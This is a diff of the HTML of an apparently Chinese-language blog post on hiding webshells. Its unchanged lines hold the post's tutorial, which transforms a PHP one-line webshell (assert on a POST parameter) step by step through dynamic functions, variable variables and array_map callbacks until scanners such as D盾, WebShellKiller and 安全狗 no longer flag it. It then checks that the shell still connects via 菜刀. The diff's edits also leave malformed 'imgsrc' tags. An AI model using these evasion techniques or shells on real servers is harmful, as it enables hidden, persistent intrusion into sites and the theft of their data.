+</div><p><imgsrc="/posts/security/web-security/hide-your-webshell/ex_8_hu2bcc87098c6bbdd36c27901ba3c08e7f_53111_936x502_resize_q75_h2_box_3.webp"
         alt="/posts/security/web-security/hide-your-webshell/ex_8_hu2bcc87098c6bbdd36c27901ba3c08e7f_53111_936x502_resize_q75_h2_box_3.webp"
-        title="preg_replace方法"
-         height="502"
-         width="936"
-        loading="lazy"
+        title="preg_replace方法"height="502"width="936"loading="lazy"
     /></p>
 <h3 id="ob_start"><a href="#ob_start" class="header-mark headerLink">ob_start</a></h3>
 <p>ob_start函数是打开输出控制缓冲，传入的参数会在使用ob_end_flush函数的时候去调用它执行输出在缓冲区的东西。</p>
@@ -3992,25 +2796,9 @@
 </span></span><span class="line"><span class="cl"><span class="nx">ob_end_flush</span><span class="p">();</span><span class="c1">//输出全部内容到浏览器
 </span></span></span></code></pre></td></tr></table></div>
 </div>
-</div><p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/security/web-security/hide-your-webshell/ex_9_hu8b212336840fc1c0d957a1964b8cb0f7_21740_714x326_resize_q75_h2_box_3.webp"
+</div><p><imgsrc="/posts/security/web-security/hide-your-webshell/ex_9_hu8b212336840fc1c0d957a1964b8cb0f7_21740_714x326_resize_q75_h2_box_3.webp"
         alt="/posts/security/web-security/hide-your-webshell/ex_9_hu8b212336840fc1c0d957a1964b8cb0f7_21740_714x326_resize_q75_h2_box_3.webp"
-        title="ob_start"
-         height="326"
-         width="714"
-        loading="lazy"
+        title="ob_start"height="326"width="714"loading="lazy"
     /></p>
 <h2 id="编写免杀"><a href="#编写免杀" class="header-mark headerLink">编写免杀</a></h2>
 <p>上面说了那么多其实都是一句话木马的思路，每一种方式都可以写成一句话木马，而想要免杀常常会多种组合到一起，下面从最简单的木马一步步变形，达到免杀的目的。</p>
@@ -4022,25 +2810,9 @@
 <pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">assert</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;x&#39;</span><span class="p">]);</span>
 </span></span></code></pre></td></tr></table></div>
 </div>
-</div><p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/security/web-security/hide-your-webshell/ex_10_hu2afc3390c23b7b6f7590d3d1d6f0dd3f_29786_844x581_resize_q75_h2_box_3.webp"
+</div><p><imgsrc="/posts/security/web-security/hide-your-webshell/ex_10_hu2afc3390c23b7b6f7590d3d1d6f0dd3f_29786_844x581_resize_q75_h2_box_3.webp"
         alt="/posts/security/web-security/hide-your-webshell/ex_10_hu2afc3390c23b7b6f7590d3d1d6f0dd3f_29786_844x581_resize_q75_h2_box_3.webp"
-        title="5级"
-         height="581"
-         width="844"
-        loading="lazy"
+        title="5级"height="581"width="844"loading="lazy"
     /></p>
 <p>这种就是最简单的一句话木马，使用D盾扫一下，可以看到5级，没有什么好说的。</p>
 <p>动态函数方法,把assert这个函数赋值两次变量,再把变量当成函数执行。</p>
@@ -4054,25 +2826,9 @@
 </span></span><span class="line"><span class="cl"><span class="nv">$c</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;x&#39;</span><span class="p">]);</span>
 </span></span></code></pre></td></tr></table></div>
 </div>
-</div><p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/security/web-security/hide-your-webshell/ex_11_hu3e5f8c092f0b7d4c0b94c8dfe8c50c65_30259_844x581_resize_q75_h2_box_3.webp"
+</div><p><imgsrc="/posts/security/web-security/hide-your-webshell/ex_11_hu3e5f8c092f0b7d4c0b94c8dfe8c50c65_30259_844x581_resize_q75_h2_box_3.webp"
         alt="/posts/security/web-security/hide-your-webshell/ex_11_hu3e5f8c092f0b7d4c0b94c8dfe8c50c65_30259_844x581_resize_q75_h2_box_3.webp"
-        title="4级"
-         height="581"
-         width="844"
-        loading="lazy"
+        title="4级"height="581"width="844"loading="lazy"
     /></p>
 <p>回调函数方法，把assert函数当作参数传给array_map去调用执行。</p>
 <div class="highlight"><div class="chroma">
@@ -4087,25 +2843,9 @@
 </span></span><span class="line"><span class="cl"><span class="nx">array_map</span><span class="p">(</span><span class="nv">$fun</span><span class="p">,</span><span class="k">array</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;x&#39;</span><span class="p">]));</span>
 </span></span></code></pre></td></tr></table></div>
 </div>
-</div><p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/security/web-security/hide-your-webshell/ex_12_hu99b5d973ac06bbc3e0ff9685aa3102bb_30165_845x581_resize_q75_h2_box_3.webp"
+</div><p><imgsrc="/posts/security/web-security/hide-your-webshell/ex_12_hu99b5d973ac06bbc3e0ff9685aa3102bb_30165_845x581_resize_q75_h2_box_3.webp"
         alt="/posts/security/web-security/hide-your-webshell/ex_12_hu99b5d973ac06bbc3e0ff9685aa3102bb_30165_845x581_resize_q75_h2_box_3.webp"
-        title="4级"
-         height="581"
-         width="845"
-        loading="lazy"
+        title="4级"height="581"width="845"loading="lazy"
     /></p>
 <p>可以看到上面的都是通过两种方法的结合，简单的处理一下，就变成了4级，感兴趣的可以把其他的方法都尝试一下，4级的很简单，我们去看看3级的都是怎么处理的</p>
 <p>通过上面的动态函数方法我们可以思考，函数可以当成字符串赋值给变量，那么变量也一定能当成字符串赋值给变量，但调用时需要用$$</p>
@@ -4123,25 +2863,9 @@
 </span></span><span class="line"><span class="cl"><span class="nv">$$c</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;x&#39;</span><span class="p">]);</span>
 </span></span></code></pre></td></tr></table></div>
 </div>
-</div><p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/security/web-security/hide-your-webshell/ex_13_hu6a3e1c51c2e0c295fdc6e85265639084_30221_844x581_resize_q75_h2_box_3.webp"
+</div><p><imgsrc="/posts/security/web-security/hide-your-webshell/ex_13_hu6a3e1c51c2e0c295fdc6e85265639084_30221_844x581_resize_q75_h2_box_3.webp"
         alt="/posts/security/web-security/hide-your-webshell/ex_13_hu6a3e1c51c2e0c295fdc6e85265639084_30221_844x581_resize_q75_h2_box_3.webp"
-        title="3级"
-         height="581"
-         width="844"
-        loading="lazy"
+        title="3级"height="581"width="844"loading="lazy"
     /></p>
 <p>我们在把这种方法结合到回调函数方法中，可以看到，已经是2级了</p>
 <div class="highlight"><div class="chroma">
@@ -4158,25 +2882,9 @@
 </span></span><span class="line"><span class="cl"><span class="nx">array_map</span><span class="p">(</span><span class="nv">$$f</span><span class="p">,</span><span class="k">array</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;x&#39;</span><span class="p">]));</span>
 </span></span></code></pre></td></tr></table></div>
 </div>
-</div><p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/security/web-security/hide-your-webshell/ex_14_hub50b6884ea01b7a46090001d79a243b0_30197_845x581_resize_q75_h2_box_3.webp"
+</div><p><imgsrc="/posts/security/web-security/hide-your-webshell/ex_14_hub50b6884ea01b7a46090001d79a243b0_30197_845x581_resize_q75_h2_box_3.webp"
         alt="/posts/security/web-security/hide-your-webshell/ex_14_hub50b6884ea01b7a46090001d79a243b0_30197_845x581_resize_q75_h2_box_3.webp"
-        title="2级"
-         height="581"
-         width="845"
-        loading="lazy"
+        title="2级"height="581"width="845"loading="lazy"
     /></p>
 <p>这时候我们看一下D盾中的说明：array_map中的参数可疑，我们这时候可以用函数封装一下参数</p>
 <div class="highlight"><div class="chroma">
@@ -4205,25 +2913,9 @@
 </span></span><span class="line"><span class="cl"><span class="nx">array_map</span><span class="p">(</span><span class="nv">$c</span><span class="p">,</span><span class="nv">$b</span><span class="p">);</span>
 </span></span></code></pre></td></tr></table></div>
 </div>
-</div><p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/security/web-security/hide-your-webshell/ex_15_hue00e5697a33a14d7a10038f6bed474fb_30324_844x581_resize_q75_h2_box_3.webp"
+</div><p><imgsrc="/posts/security/web-security/hide-your-webshell/ex_15_hue00e5697a33a14d7a10038f6bed474fb_30324_844x581_resize_q75_h2_box_3.webp"
         alt="/posts/security/web-security/hide-your-webshell/ex_15_hue00e5697a33a14d7a10038f6bed474fb_30324_844x581_resize_q75_h2_box_3.webp"
-        title="1级"
-         height="581"
-         width="844"
-        loading="lazy"
+        title="1级"height="581"width="844"loading="lazy"
     /></p>
 <p>1级了，离目标近在咫尺了，这时候我们应该考虑让一句话木马像正常的代码，在好好的封装一下</p>
 <div class="highlight"><div class="chroma">
@@ -4274,110 +2966,30 @@
 </span></span><span class="line"><span class="cl"><span class="nx">array_map</span><span class="p">(</span><span class="nv">$b</span><span class="p">,</span><span class="k">array</span><span class="p">(</span><span class="nv">$c</span><span class="p">));</span>
 </span></span></code></pre></td></tr></table></div>
 </div>
-</div><p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/security/web-security/hide-your-webshell/ex_16_hu6b13db84172005f67aad3a46a58a5a68_28899_845x581_resize_q75_h2_box_3.webp"
+</div><p><imgsrc="/posts/security/web-security/hide-your-webshell/ex_16_hu6b13db84172005f67aad3a46a58a5a68_28899_845x581_resize_q75_h2_box_3.webp"
         alt="/posts/security/web-security/hide-your-webshell/ex_16_hu6b13db84172005f67aad3a46a58a5a68_28899_845x581_resize_q75_h2_box_3.webp"
-        title="免杀"
-         height="581"
-         width="845"
-        loading="lazy"
+        title="免杀"height="581"width="845"loading="lazy"
     /></p>
 <p>再试试其他免杀工具。</p>
 <p>WebShellKiller：</p>
-<p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/security/web-security/hide-your-webshell/ex_17_hu4f310e46a11473291d0bace3bca4e647_49036_740x520_resize_q75_h2_box_3.webp"
+<p><imgsrc="/posts/security/web-security/hide-your-webshell/ex_17_hu4f310e46a11473291d0bace3bca4e647_49036_740x520_resize_q75_h2_box_3.webp"
         alt="/posts/security/web-security/hide-your-webshell/ex_17_hu4f310e46a11473291d0bace3bca4e647_49036_740x520_resize_q75_h2_box_3.webp"
-        title="WebShellKiller"
-         height="520"
-         width="740"
-        loading="lazy"
+        title="WebShellKiller"height="520"width="740"loading="lazy"
     /></p>
 <p>安全狗：</p>
-<p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/security/web-security/hide-your-webshell/ex_18_hu68a1b2dadde3adf5d601fa990f392b41_32502_902x602_resize_q75_h2_box_3.webp"
+<p><imgsrc="/posts/security/web-security/hide-your-webshell/ex_18_hu68a1b2dadde3adf5d601fa990f392b41_32502_902x602_resize_q75_h2_box_3.webp"
         alt="/posts/security/web-security/hide-your-webshell/ex_18_hu68a1b2dadde3adf5d601fa990f392b41_32502_902x602_resize_q75_h2_box_3.webp"
-        title="安全狗"
-         height="602"
-         width="902"
-        loading="lazy"
+        title="安全狗"height="602"width="902"loading="lazy"
     /></p>
 <p>微步云沙箱：</p>
-<p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/security/web-security/hide-your-webshell/ex_19_hua5ac026cb9960f669926a899600388ff_53882_1004x568_resize_q75_h2_box_3.webp"
+<p><imgsrc="/posts/security/web-security/hide-your-webshell/ex_19_hua5ac026cb9960f669926a899600388ff_53882_1004x568_resize_q75_h2_box_3.webp"
         alt="/posts/security/web-security/hide-your-webshell/ex_19_hua5ac026cb9960f669926a899600388ff_53882_1004x568_resize_q75_h2_box_3.webp"
-        title="微步云沙箱"
-         height="568"
-         width="1004"
-        loading="lazy"
+        title="微步云沙箱"height="568"width="1004"loading="lazy"
     /></p>
 <p>再试试可不可以连接没有问题，完美！！</p>
-<p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/security/web-security/hide-your-webshell/ex_20_hu4698517c26c830e386e3d43086c2a553_27891_1024x633_resize_q75_h2_box_3.webp"
+<p><imgsrc="/posts/security/web-security/hide-your-webshell/ex_20_hu4698517c26c830e386e3d43086c2a553_27891_1024x633_resize_q75_h2_box_3.webp"
         alt="/posts/security/web-security/hide-your-webshell/ex_20_hu4698517c26c830e386e3d43086c2a553_27891_1024x633_resize_q75_h2_box_3.webp"
-        title="菜刀"
-         height="633"
-         width="1024"
-        loading="lazy"
+        title="菜刀"height="633"width="1024"loading="lazy"
     /></p>
 <h2 id="更好的隐藏webshell一些建议"><a href="#更好的隐藏webshell一些建议" class="header-mark headerLink">更好的隐藏webshell一些建议</a></h2>
 <ol>
